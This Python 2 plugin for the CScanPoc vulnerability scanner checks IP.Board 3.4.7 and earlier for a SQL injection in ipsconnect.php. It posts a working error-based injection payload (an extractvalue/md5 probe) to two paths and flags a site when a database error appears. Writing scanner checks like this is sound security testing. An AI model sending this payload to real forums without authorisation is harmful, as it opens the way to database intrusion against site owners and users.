# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'IPBoard_0000' # 平台漏洞编号，留空
    name = 'IP.Board <= 3.4.7 /ipsconnect.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-11-09'  # 漏洞公布时间
    desc = '''
        IP.Board version 3.4.7 (latest) suffers from a SQL injection vulnerability.
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'IP.Board'  # 漏洞应用名称
    product_version = '<= 3.4.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd0d71972-1f77-46b6-9a77-bb59171aa882'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = 'act=login&idType=id&id[]=-1&id[]=-1) and 1!="\'" and extractvalue(1,concat(md5(123)))#'
            url_list = ['/interface/ipsconnect/ipsconnect.php', '/forums/interface/ipsconnect/ipsconnect.php']
            for file_path in url_list:
                verify_url = '{target}'.format(target=self.target)+file_path
                try:
                    urllib2.urlopen(urllib2.Request(verify_url, data=payload))
                except urllib2.HTTPError, e:
                    if e.code == 503:
                        if 'There appears to be an error with the database.' in e.read():
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()